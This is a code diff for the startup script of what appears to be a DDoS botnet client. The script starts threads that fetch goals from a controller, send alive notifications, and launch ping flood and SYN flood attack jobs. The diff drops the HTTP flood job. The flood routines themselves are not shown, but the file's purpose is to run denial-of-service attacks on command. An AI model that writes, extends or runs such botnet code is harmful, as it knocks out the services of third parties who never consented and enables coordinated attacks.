@@ -13,19 +13,16 @@ load_injection_container(str(os.path.dirname(rvkinh_message_client.__file__)))
 import threading
 
 # Initialize jobs
-from jobs.jobs_registry import JOB_CONTROLLER_GET_GOAL, JOB_CONTROLLER_NOTIFY_ALIVE, JOB_ATTACK_HTTP_FLOOD, JOB_ATTACK_PING_FLOOD, JOB_ATTACK_SYN_FLOOD
+from jobs.jobs_registry import JOB_CONTROLLER_GET_GOAL, JOB_CONTROLLER_NOTIFY_ALIVE, JOB_ATTACK_PING_FLOOD, JOB_ATTACK_SYN_FLOOD
 thread1 = threading.Thread(target=JOB_CONTROLLER_GET_GOAL.job_loop)
 thread1.start()
 JOB_CONTROLLER_GET_GOAL.start()
 thread2 = threading.Thread(target=JOB_CONTROLLER_NOTIFY_ALIVE.job_loop)
 thread2.start()
 JOB_CONTROLLER_NOTIFY_ALIVE.start()
-thread3 = threading.Thread(target=JOB_ATTACK_HTTP_FLOOD.job_loop)
+thread3 = threading.Thread(target=JOB_ATTACK_PING_FLOOD.job_loop)
 thread3.start()
-JOB_ATTACK_HTTP_FLOOD.start()
-thread4 = threading.Thread(target=JOB_ATTACK_PING_FLOOD.job_loop)
-thread4.start()
 JOB_ATTACK_PING_FLOOD.start()
-thread5 = threading.Thread(target=JOB_ATTACK_SYN_FLOOD.job_loop)
-thread5.start()
+thread4 = threading.Thread(target=JOB_ATTACK_SYN_FLOOD.job_loop)
+thread4.start()
 JOB_ATTACK_SYN_FLOOD.start()
